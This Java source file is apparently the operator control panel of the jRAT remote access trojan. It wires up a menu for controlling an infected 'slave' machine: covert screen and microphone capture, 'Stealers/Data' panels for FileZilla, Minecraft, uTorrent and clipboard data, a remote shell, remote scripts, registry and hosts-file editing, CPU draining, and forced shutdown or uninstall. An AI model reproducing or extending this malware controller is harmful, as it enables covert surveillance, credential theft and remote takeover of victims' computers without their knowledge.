package com.redpois0n.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTree;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import org.jrat.project.api.BaseControlPanel;
import org.jrat.project.api.RATControlMenuEntry;

import com.redpois0n.Constants;
import com.redpois0n.Script;
import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.listeners.Performable;
import com.redpois0n.packets.OutgoingHeader;
import com.redpois0n.plugins.Plugin;
import com.redpois0n.plugins.PluginLoader;
import com.redpois0n.plugins.RATServerFormat;
import com.redpois0n.ui.panels.PanelControlActivePorts;
import com.redpois0n.ui.panels.PanelControlAdapters;
import com.redpois0n.ui.panels.PanelControlCPU;
import com.redpois0n.ui.panels.PanelControlClipboard;
import com.redpois0n.ui.panels.PanelControlComputerInfo;
import com.redpois0n.ui.panels.PanelControlConfig;
import com.redpois0n.ui.panels.PanelControlDownloadManager;
import com.redpois0n.ui.panels.PanelControlDrives;
import com.redpois0n.ui.panels.PanelControlErrorLog;
import com.redpois0n.ui.panels.PanelControlFileZilla;
import com.redpois0n.ui.panels.PanelControlFunManager;
import com.redpois0n.ui.panels.PanelControlHostsFile;
import com.redpois0n.ui.panels.PanelControlInstalledPrograms;
import com.redpois0n.ui.panels.PanelControlJVM;
import com.redpois0n.ui.panels.PanelControlLANComputers;
import com.redpois0n.ui.panels.PanelControlLocales;
import com.redpois0n.ui.panels.PanelControlMessagebox;
import com.redpois0n.ui.panels.PanelControlMonitors;
import com.redpois0n.ui.panels.PanelControlNetGateway;
import com.redpois0n.ui.panels.PanelControlPiano;
import com.redpois0n.ui.panels.PanelControlPlugins;
import com.redpois0n.ui.panels.PanelControlPrinter;
import com.redpois0n.ui.panels.PanelControlRegStart;
import com.redpois0n.ui.panels.PanelControlRemoteProcess;
import com.redpois0n.ui.panels.PanelControlScript;
import com.redpois0n.ui.panels.PanelControlSearch;
import com.redpois0n.ui.panels.PanelControlServices;
import com.redpois0n.ui.panels.PanelControlSpeech;
import com.redpois0n.ui.panels.PanelControlSystemMonitor;
import com.redpois0n.ui.panels.PanelControlTrace;
import com.redpois0n.ui.panels.PanelControluTorrentDownloads;
import com.redpois0n.ui.renderers.ControlPanelRenderer;
import com.redpois0n.utils.FlagUtils;
import com.redpois0n.utils.IconUtils;
import com.redpois0n.utils.Util;

@SuppressWarnings({ "serial" })
public class FrameControlPanel extends BaseFrame {

	public Slave slave;

	private JPanel contentPane;
	private JPanel panel;
	private JTree tree;

	public static HashMap<Slave, FrameControlPanel> instances = new HashMap<Slave, FrameControlPanel>();
	public HashMap<String, JPanel> panels = new HashMap<String, JPanel>();
	public HashMap<String, Performable> actions = new HashMap<String, Performable>();
	public static final List<RATControlMenuEntry> entries = new ArrayList<RATControlMenuEntry>();

	private JTabbedPane tabbedPane;
	private JMenuBar menuBar;
	private JMenu mnActions;
	private JMenuItem mntmCollapseAll;
	private JMenuItem mntmExpandAll;
	private JCheckBoxMenuItem chckbxmntmRootVisible;

	public JTabbedPane getTabbedPane() {
		return tabbedPane;
	}

	public JTree getTree() {
		return tree;
	}

	public void loadItems() {
		if (entries.size() == 0) {
			for (Plugin p : PluginLoader.plugins) {
				for (RATControlMenuEntry entry : p.getControlItems()) {
					entries.add(entry);
				}
			}
		}
	}

	public FrameControlPanel(final Slave slave) {
		super();
		loadItems();
		super.addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				for (RATControlMenuEntry entry : entries) {
					entry.instances.remove(slave.getIP());
				}
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameControlPanel.class.getResource("/icons/controlpanel.png")));
		setTitle("Control Panel - " + slave.getIP() + " - " + slave.getComputerName());
		this.slave = slave;
		final Slave sl = slave;
		instances.put(slave, this);

		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 807, 414);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		panel = new JPanel();
		panel.setSize(600, 350);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 175, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel, GroupLayout.PREFERRED_SIZE, 607, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false).addComponent(scrollPane, Alignment.LEADING).addComponent(panel, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 364, Short.MAX_VALUE)).addContainerGap(12, Short.MAX_VALUE)));

		tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.addTreeSelectionListener(new TreeSelectionListener() {
			public void valueChanged(TreeSelectionEvent arg0) {
				try {
					checkUp(arg0.getPath().getPath()[1].toString().toLowerCase());
					String what = arg0.getPath().getPath()[2].toString().toLowerCase();
					if (!actions.containsKey(what)) {
						JPanel p = panels.get(what);
						tabbedPane.setSelectedComponent(p);
					} else {
						Performable listener = actions.get(what);
						listener.perform();
					}
				} catch (Exception ex) {

				}
			}
		});
		tree.setRootVisible(false);
		tree.setCellRenderer(getRenderer());
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Control Panel") {
			{
				addNodes(this);
			}
		}));
		scrollPane.setViewportView(tree);
		contentPane.setLayout(gl_contentPane);

		expandAll(tree);

		menuBar = new JMenuBar();
		scrollPane.setColumnHeaderView(menuBar);

		mnActions = new JMenu("Actions");
		menuBar.add(mnActions);

		mntmCollapseAll = new JMenuItem("Collapse all");
		mntmCollapseAll.setIcon(new ImageIcon(FrameControlPanel.class.getResource("/icons/collapse.png")));
		mntmCollapseAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				collapseAll(tree);
			}
		});
		mnActions.add(mntmCollapseAll);

		mntmExpandAll = new JMenuItem("Expand all");
		mntmExpandAll.setIcon(new ImageIcon(FrameControlPanel.class.getResource("/icons/expand.png")));
		mntmExpandAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				expandAll(tree);
			}
		});
		mnActions.add(mntmExpandAll);

		chckbxmntmRootVisible = new JCheckBoxMenuItem("Root visible");
		chckbxmntmRootVisible.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				tree.setRootVisible(chckbxmntmRootVisible.isSelected());
			}
		});
		mnActions.add(chckbxmntmRootVisible);

		mnActions.addSeparator();

		JMenuItem mntmReload = new JMenuItem("Reload");
		mntmReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setVisible(false);
				dispose();
				new FrameControlPanel(sl).setVisible(true);
			}
		});
		mntmReload.setIcon(new ImageIcon(FrameControlPanel.class.getResource("/icons/refresh.png")));
		mnActions.add(mntmReload);

		JMenuItem mntmClose = new JMenuItem("Close");
		mntmClose.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				setVisible(false);
				dispose();
			}
		});
		mntmClose.setIcon(new ImageIcon(FrameControlPanel.class.getResource("/icons/delete.png")));
		mnActions.add(mntmClose);
		addPanels();
		addActions();

		panel.setLayout(new BorderLayout(0, 0));

		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		panel.add(tabbedPane, BorderLayout.CENTER);

		checkUp("system info");
	}

	public ControlPanelRenderer getRenderer() {
		final ControlPanelRenderer r = new ControlPanelRenderer();
		new Thread() {
			public void run() {
				r.icons.put("control panel", IconUtils.getIcon("controlpanel"));
				r.icons.put("system info", IconUtils.getIcon("info"));
				r.icons.put("computer info", IconUtils.getIcon("computer_info"));
				r.icons.put("system monitor", IconUtils.getIcon("meter"));
				r.icons.put("fun manager", IconUtils.getIcon("fun_manager"));
				r.icons.put("fun", IconUtils.getIcon("fun"));
				r.icons.put("messagebox", IconUtils.getIcon("messagebox"));
				r.icons.put("remote chat", IconUtils.getIcon("chat"));
				r.icons.put("remote shell", IconUtils.getIcon("cmd"));
				r.icons.put("remote process", IconUtils.getIcon("process"));
				r.icons.put("system functions", IconUtils.getIcon("system"));
				r.icons.put("spy functions", IconUtils.getIcon("fingerprint"));
				r.icons.put("remote screen", IconUtils.getIcon("screen"));
				r.icons.put("html", Script.getIcon(Script.HTML));
				r.icons.put("javascript", Script.getIcon(Script.JS));
				r.icons.put("batch", Script.getIcon(Script.BAT));
				r.icons.put("vb script", Script.getIcon(Script.VB));
				r.icons.put("shell script", Script.getIcon(Script.SH));
				r.icons.put("scripting", IconUtils.getIcon("scripting"));
				r.icons.put("file system", IconUtils.getIcon("files"));
				r.icons.put("file searcher", IconUtils.getIcon("folder_search"));
				r.icons.put("file manager", IconUtils.getIcon("folder_go"));
				r.icons.put("hosts file", IconUtils.getIcon("host"));
				r.icons.put("utorrent downloads", IconUtils.getIcon("utorrent"));
				r.icons.put("stealers/data", IconUtils.getIcon("coins"));
				r.icons.put("minecraft", IconUtils.getIcon("minecraft"));
				r.icons.put("download manager", IconUtils.getIcon("down_arrow"));
				r.icons.put("network functions", IconUtils.getIcon("wall__go"));
				r.icons.put("computer power", IconUtils.getIcon("battery"));
				r.icons.put("shutdown", IconUtils.getIcon("shutdown"));
				r.icons.put("restart", IconUtils.getIcon("restart"));
				r.icons.put("logout", IconUtils.getIcon("logout"));
				r.icons.put("sleep mode", IconUtils.getIcon("sleepmode"));
				r.icons.put("lock", IconUtils.getIcon("lock"));
				r.icons.put("clipboard", IconUtils.getIcon("clipboard"));
				r.icons.put("server actions", IconUtils.getIcon("toolbox"));
				r.icons.put("reconnect", IconUtils.getIcon("refresh_blue"));
				r.icons.put("disconnect", IconUtils.getIcon("delete"));
				r.icons.put("restart connection", IconUtils.getIcon("refresh"));
				r.icons.put("uninstall", IconUtils.getIcon("exit"));
				r.icons.put("system properties", IconUtils.getIcon("properties"));
				r.icons.put("environment variables", IconUtils.getIcon("categories"));
				r.icons.put("jvm info", IconUtils.getIcon("javascript"));
				r.icons.put("piano", IconUtils.getIcon("piano"));
				r.icons.put("filezilla", IconUtils.getIcon("filezilla"));
				r.icons.put("printer", IconUtils.getIcon("printer"));
				r.icons.put("misc", IconUtils.getIcon("other"));
				r.icons.put("lan computers", IconUtils.getIcon("ssyn_flood"));
				r.icons.put("net gateway", IconUtils.getIcon("gateway"));
				r.icons.put("traffic", IconUtils.getIcon("speedometer"));
				r.icons.put("active ports", IconUtils.getIcon("ports"));
				r.icons.put("redirect", IconUtils.getIcon("redirect"));
				r.icons.put("drain cpu", IconUtils.getIcon("burn"));
				r.icons.put("speech", IconUtils.getIcon("balloon_sound"));
				r.icons.put("trace", IconUtils.getIcon("location"));
				r.icons.put("windows services", IconUtils.getIcon("block"));
				r.icons.put("remote msconfig", IconUtils.getIcon("service_go"));
				r.icons.put("registry startup", IconUtils.getIcon("toolbox"));
				r.icons.put("registry", IconUtils.getIcon("registry"));
				r.icons.put("installed programs", IconUtils.getIcon("installed"));
				r.icons.put("network adapters", IconUtils.getIcon("adapters"));
				r.icons.put("sound capture", IconUtils.getIcon("microphone"));
				r.icons.put("no plugins available", IconUtils.getIcon("plugin_warning"));
				r.icons.put("plugins", IconUtils.getIcon("plugin"));
				r.icons.put("drives", IconUtils.getIcon("drives"));
				r.icons.put("monitors", IconUtils.getIcon("monitor_network"));
				r.icons.put("error log", IconUtils.getIcon("error"));
				r.icons.put("config", IconUtils.getIcon("tab_settings"));
				r.icons.put("view installed plugins", IconUtils.getIcon("plugin_go"));
				r.icons.put("notes", IconUtils.getIcon("sticky-notes-pin"));
				r.icons.put("locales", FlagUtils.getFlag(slave));
				r.icons.put("quick remote screen", IconUtils.getIcon("quick_remote_desktop"));

				ImageIcon plugin = IconUtils.getIcon("plugin");

				for (RATControlMenuEntry entry : entries) {
					if (entry.getIcon() != null) {
						r.icons.put(entry.getName().toLowerCase(), entry.getIcon());
					} else {
						r.icons.put(entry.getName().toLowerCase(), plugin);
					}
				}
				getTree().repaint();
			}
		}.start();

		return r;
	}

	public void checkUp(String str) {
		HashMap<String, ImageIcon> i = ((ControlPanelRenderer) tree.getCellRenderer()).icons;

		if (str.equals("system info")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Computer Info", i.get("computer info"), panels.get("computer info"));
			tabbedPane.addTab("System Info", i.get("system monitor"), panels.get("system monitor"));
			tabbedPane.addTab("Locales", i.get("locales"), panels.get("locales"));
			tabbedPane.addTab("Drives", i.get("drives"), panels.get("drives"));
			tabbedPane.addTab("Monitors", i.get("monitors"), panels.get("monitors"));
			tabbedPane.addTab("JVM Info", i.get("jvm info"), panels.get("jvm info"));
			tabbedPane.addTab("Config", i.get("config"), panels.get("config"));
			tabbedPane.addTab("Trace", i.get("trace"), panels.get("trace"));
		} else if (str.equals("fun")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Fun Manager", i.get("fun manager"), panels.get("fun manager"));
			tabbedPane.addTab("Piano", i.get("piano"), panels.get("piano"));
			tabbedPane.addTab("Messagebox", i.get("messagebox"), panels.get("messagebox"));
			tabbedPane.addTab("Drain CPU", i.get("drain cpu"), panels.get("drain cpu"));
			tabbedPane.addTab("Speech", i.get("speech"), panels.get("speech"));
		} else if (str.equals("system functions")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Remote Process", i.get("remote process"), panels.get("remote process"));
			tabbedPane.addTab("Hosts File", i.get("hosts file"), panels.get("hosts file"));
			tabbedPane.addTab("Installed Programs", i.get("installed programs"), panels.get("installed programs"));
		} else if (str.equals("scripting")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("HTML", i.get("html"), panels.get("html"));
			tabbedPane.addTab("Batch", i.get("batch"), panels.get("batch"));
			tabbedPane.addTab("JavaScript", i.get("javascript"), panels.get("javascript"));
			tabbedPane.addTab("VB Script", i.get("vb script"), panels.get("vb script"));
			tabbedPane.addTab("Shell Script", i.get("shell script"), panels.get("shell script"));
		} else if (str.equals("file system")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("File Searcher", i.get("file searcher"), panels.get("file searcher"));
		} else if (str.equals("stealers/data")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("uTorrent Downloads", i.get("utorrent downloads"), panels.get("utorrent downloads"));
			tabbedPane.addTab("FileZilla", i.get("filezilla"), panels.get("filezilla"));
			tabbedPane.addTab("Clipboard", i.get("clipboard"), panels.get("clipboard"));
		} else if (str.equals("network functions")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Download manager", i.get("download manager"), panels.get("download manager"));
			tabbedPane.addTab("LAN Computers", i.get("lan computers"), panels.get("lan computers"));
			tabbedPane.addTab("Net Gateway", i.get("net gateway"), panels.get("net gateway"));
			tabbedPane.addTab("Active Ports", i.get("active ports"), panels.get("active ports"));
			tabbedPane.addTab("Network Adapters", i.get("network adapters"), panels.get("network adapters"));
		} else if (str.equals("misc")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Printer", i.get("printer"), panels.get("printer"));
			tabbedPane.addTab("Error Log", i.get("error log"), panels.get("error log"));
		} else if (str.equals("remote msconfig")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Windows Services", i.get("windows services"), panels.get("windows services"));
			tabbedPane.addTab("Registry Startup", i.get("registry startup"), panels.get("registry startup"));
		} else if (str.equals("plugins")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("View Installed Plugins", i.get("view installed plugins"), panels.get("view installed plugins"));

			ImageIcon def = i.get("plugins");
			for (RATControlMenuEntry entry : entries) {
				try {
					BaseControlPanel panel = entry.newPanelInstance(RATServerFormat.format(slave));
					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? def : entry.getIcon(), panel);
					entry.instances.put(slave.getIP(), panel);

				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	public void addNodes(DefaultMutableTreeNode n) {
		DefaultMutableTreeNode systeminfo = new DefaultMutableTreeNode("System Info");
		n.add(systeminfo);

		systeminfo.add(new DefaultMutableTreeNode("Computer Info"));
		systeminfo.add(new DefaultMutableTreeNode("System Monitor"));
		systeminfo.add(new DefaultMutableTreeNode("Locales"));
		systeminfo.add(new DefaultMutableTreeNode("Environment Variables"));
		systeminfo.add(new DefaultMutableTreeNode("System Properties"));
		systeminfo.add(new DefaultMutableTreeNode("Drives"));
		systeminfo.add(new DefaultMutableTreeNode("Monitors"));
		systeminfo.add(new DefaultMutableTreeNode("JVM Info"));
		systeminfo.add(new DefaultMutableTreeNode("Config"));
		systeminfo.add(new DefaultMutableTreeNode("Trace"));

		DefaultMutableTreeNode fun = new DefaultMutableTreeNode("Fun");
		n.add(fun);
		fun.add(new DefaultMutableTreeNode("Fun Manager"));
		fun.add(new DefaultMutableTreeNode("Piano"));
		fun.add(new DefaultMutableTreeNode("Messagebox"));
		fun.add(new DefaultMutableTreeNode("Remote Chat"));
		fun.add(new DefaultMutableTreeNode("Drain CPU"));
		fun.add(new DefaultMutableTreeNode("Speech"));

		DefaultMutableTreeNode systemfunctions = new DefaultMutableTreeNode("System Functions");
		n.add(systemfunctions);
		systemfunctions.add(new DefaultMutableTreeNode("Remote Shell"));
		systemfunctions.add(new DefaultMutableTreeNode("Remote Process"));
		systemfunctions.add(new DefaultMutableTreeNode("Hosts File"));
		systemfunctions.add(new DefaultMutableTreeNode("Registry"));
		systemfunctions.add(new DefaultMutableTreeNode("Installed Programs"));

		DefaultMutableTreeNode msconfig = new DefaultMutableTreeNode("Remote MSConfig");
		n.add(msconfig);
		msconfig.add(new DefaultMutableTreeNode("Windows Services"));
		msconfig.add(new DefaultMutableTreeNode("Registry Startup"));

		DefaultMutableTreeNode spy = new DefaultMutableTreeNode("Spy Functions");
		n.add(spy);
		spy.add(new DefaultMutableTreeNode("Remote Screen"));
		spy.add(new DefaultMutableTreeNode("Quick Remote Screen"));
		spy.add(new DefaultMutableTreeNode("Sound Capture"));

		DefaultMutableTreeNode scripting = new DefaultMutableTreeNode("Scripting");
		n.add(scripting);
		scripting.add(new DefaultMutableTreeNode("HTML"));
		scripting.add(new DefaultMutableTreeNode("Batch"));
		scripting.add(new DefaultMutableTreeNode("JavaScript"));
		scripting.add(new DefaultMutableTreeNode("VB Script"));
		scripting.add(new DefaultMutableTreeNode("Shell Script"));

		DefaultMutableTreeNode filesystem = new DefaultMutableTreeNode("File System");
		n.add(filesystem);
		filesystem.add(new DefaultMutableTreeNode("File Manager"));
		filesystem.add(new DefaultMutableTreeNode("File Searcher"));

		DefaultMutableTreeNode stealersdata = new DefaultMutableTreeNode("Stealers/Data");
		n.add(stealersdata);
		stealersdata.add(new DefaultMutableTreeNode("uTorrent downloads"));
		stealersdata.add(new DefaultMutableTreeNode("FileZilla"));
		stealersdata.add(new DefaultMutableTreeNode("Minecraft"));
		stealersdata.add(new DefaultMutableTreeNode("Clipboard"));

		DefaultMutableTreeNode network = new DefaultMutableTreeNode("Network functions");
		n.add(network);
		network.add(new DefaultMutableTreeNode("Download Manager"));
		network.add(new DefaultMutableTreeNode("LAN Computers"));
		network.add(new DefaultMutableTreeNode("Net Gateway"));
		network.add(new DefaultMutableTreeNode("Active Ports"));
		network.add(new DefaultMutableTreeNode("Network Adapters"));

		DefaultMutableTreeNode power = new DefaultMutableTreeNode("Computer power");
		n.add(power);
		power.add(new DefaultMutableTreeNode("Shutdown"));
		power.add(new DefaultMutableTreeNode("Restart"));
		power.add(new DefaultMutableTreeNode("Sleep Mode"));
		power.add(new DefaultMutableTreeNode("Lock"));
		power.add(new DefaultMutableTreeNode("Logout"));

		DefaultMutableTreeNode misc = new DefaultMutableTreeNode("Misc");
		n.add(misc);
		misc.add(new DefaultMutableTreeNode("Printer"));
		misc.add(new DefaultMutableTreeNode("Traffic"));
		misc.add(new DefaultMutableTreeNode("Error Log"));
		misc.add(new DefaultMutableTreeNode("Notes"));

		DefaultMutableTreeNode plugins = new DefaultMutableTreeNode("Plugins");
		n.add(plugins);
		plugins.add(new DefaultMutableTreeNode("View Installed Plugins"));
		if (entries.size() == 0) {
			plugins.add(new DefaultMutableTreeNode("No plugins available"));
		} else {
			for (RATControlMenuEntry entry : entries) {
				plugins.add(new DefaultMutableTreeNode(entry.getName()));
			}
		}

		DefaultMutableTreeNode slave = new DefaultMutableTreeNode("Server Actions");
		n.add(slave);
		slave.add(new DefaultMutableTreeNode("Redirect"));
		slave.add(new DefaultMutableTreeNode("Restart connection"));
		slave.add(new DefaultMutableTreeNode("Reconnect"));
		slave.add(new DefaultMutableTreeNode("Disconnect"));
		slave.add(new DefaultMutableTreeNode("Uninstall"));
	}

	public void addPanels() {
		panels.clear();
		panels.put("computer info", new PanelControlComputerInfo(slave));
		panels.put("system monitor", new PanelControlSystemMonitor(slave));
		panels.put("fun manager", new PanelControlFunManager(slave));
		panels.put("messagebox", new PanelControlMessagebox(slave));
		panels.put("remote process", new PanelControlRemoteProcess(slave));
		panels.put("html", new PanelControlScript(slave, Script.HTML));
		panels.put("vb script", new PanelControlScript(slave, Script.VB));
		panels.put("batch", new PanelControlScript(slave, Script.BAT));
		panels.put("javascript", new PanelControlScript(slave, Script.JS));
		panels.put("shell script", new PanelControlScript(slave, Script.SH));
		panels.put("file searcher", new PanelControlSearch(slave));
		panels.put("hosts file", new PanelControlHostsFile(slave));
		panels.put("utorrent downloads", new PanelControluTorrentDownloads(slave));
		panels.put("download manager", new PanelControlDownloadManager(slave));
		panels.put("clipboard", new PanelControlClipboard(slave));
		panels.put("jvm info", new PanelControlJVM(slave));
		panels.put("piano", new PanelControlPiano(slave));
		panels.put("filezilla", new PanelControlFileZilla(slave));
		panels.put("printer", new PanelControlPrinter(slave));
		panels.put("lan computers", new PanelControlLANComputers(slave));
		panels.put("net gateway", new PanelControlNetGateway(slave));
		panels.put("active ports", new PanelControlActivePorts(slave));
		panels.put("drain cpu", new PanelControlCPU(slave));
		panels.put("speech", new PanelControlSpeech(slave));
		panels.put("windows services", new PanelControlServices(slave));
		panels.put("registry startup", new PanelControlRegStart(slave));
		panels.put("installed programs", new PanelControlInstalledPrograms(slave));
		panels.put("network adapters", new PanelControlAdapters(slave));
		panels.put("drives", new PanelControlDrives(slave));
		panels.put("monitors", new PanelControlMonitors(slave));
		panels.put("error log", new PanelControlErrorLog(slave));
		panels.put("config", new PanelControlConfig(slave));
		panels.put("view installed plugins", new PanelControlPlugins(slave));
		panels.put("locales", new PanelControlLocales(slave));
		panels.put("trace", new PanelControlTrace(slave));
	}

	public void addActions() {
		actions.clear();

		actions.put("sound capture", new Performable() {
			public void perform() {
				FrameRemoteSoundCapture f = new FrameRemoteSoundCapture(slave);
				f.setVisible(true);
			}
		});

		actions.put("remote shell", new Performable() {
			public void perform() {
				FrameRemoteShell frame = new FrameRemoteShell(slave);
				frame.setVisible(true);
			}
		});

		actions.put("remote chat", new Performable() {
			@Override
			public void perform() {
				FrameRemoteChat frame = new FrameRemoteChat(slave);
				frame.setVisible(true);
			}
		});

		actions.put("remote screen", new Performable() {
			@Override
			public void perform() {
				FrameRemoteScreen frame = new FrameRemoteScreen(slave);
				frame.setVisible(true);
			}
		});

		actions.put("file manager", new Performable() {
			public void perform() {
				FrameRemoteFiles frame = new FrameRemoteFiles(slave);
				frame.setVisible(true);
			}
		});

		actions.put("minecraft", new Performable() {
			public void perform() {
				FrameMinecraft frame = new FrameMinecraft(slave);
				frame.setVisible(true);
			}
		});

		actions.put("shutdown", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Are you sure you want to shutdown this computer?")) {
					slave.addToSendQueue(OutgoingHeader.COMPUTER_SHUTDOWN);
				}
			}
		});

		actions.put("restart", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Are you sure you want to restart this computer?")) {
					slave.addToSendQueue(OutgoingHeader.COMPUTER_RESTART);
				}
			}
		});

		actions.put("sleep mode", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Are you sure you want to put this computer in sleep mode?")) {
					slave.addToSendQueue(OutgoingHeader.COMPUTER_SLEEP);
				}
			}
		});

		actions.put("lock", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Are you sure you want to lock this computer?")) {
					slave.addToSendQueue(OutgoingHeader.COMPUTER_LOCK);
				}
			}
		});

		actions.put("logout", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Are you sure you want to logout this computer?")) {
					slave.addToSendQueue(OutgoingHeader.COMPUTER_LOGOUT);
				}
			}
		});

		actions.put("restart connection", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(OutgoingHeader.RESTART_JVM);
					slave.closeSocket(new CloseException("Restarting connection"));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("reconnect", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(OutgoingHeader.RECONNECT);
					slave.closeSocket(new CloseException("Reconnecting"));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("disconnect", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(OutgoingHeader.DISCONNECT);
					slave.closeSocket(new CloseException("Disconnecting"));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("uninstall", new Performable() {
			public void perform() {
				if (Util.yesNo("Confirm", "Confirm uninstalling this server?")) {
					try {
						slave.addToSendQueue(OutgoingHeader.UNINSTALL);
						slave.closeSocket(new CloseException("Uninstalling"));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}
		});

		actions.put("system properties", new Performable() {
			public void perform() {
				FrameSystem frame = new FrameSystem(Constants.MODE_PROP, slave);
				frame.setVisible(true);
			}
		});

		actions.put("environment variables", new Performable() {
			public void perform() {
				FrameSystem frame = new FrameSystem(Constants.MODE_ENV, slave);
				frame.setVisible(true);
			}
		});

		actions.put("traffic", new Performable() {
			public void perform() {
				FrameTraffic frame = new FrameTraffic(slave);
				frame.setVisible(true);
			}
		});

		actions.put("redirect", new Performable() {
			public void perform() {
				FrameRedirect frame = new FrameRedirect(slave);
				frame.setVisible(true);
			}
		});

		actions.put("registry", new Performable() {
			public void perform() {
				FrameRemoteRegistry frame = new FrameRemoteRegistry(slave);
				frame.setVisible(true);
			}
		});

		actions.put("notes", new Performable() {
			public void perform() {
				FrameNotes frame = new FrameNotes(slave);
				frame.setVisible(true);
			}
		});
		
		actions.put("quick remote screen", new Performable() {
			public void perform() {
				FrameQuickRemoteScreen frame = new FrameQuickRemoteScreen(slave);
				frame.setVisible(true);
			}
		});
	}

	public void expandAll(JTree tree) {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.expandRow(i);
		}
	}

	public void collapseAll(JTree tree) {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.collapseRow(i);
		}
	}
}
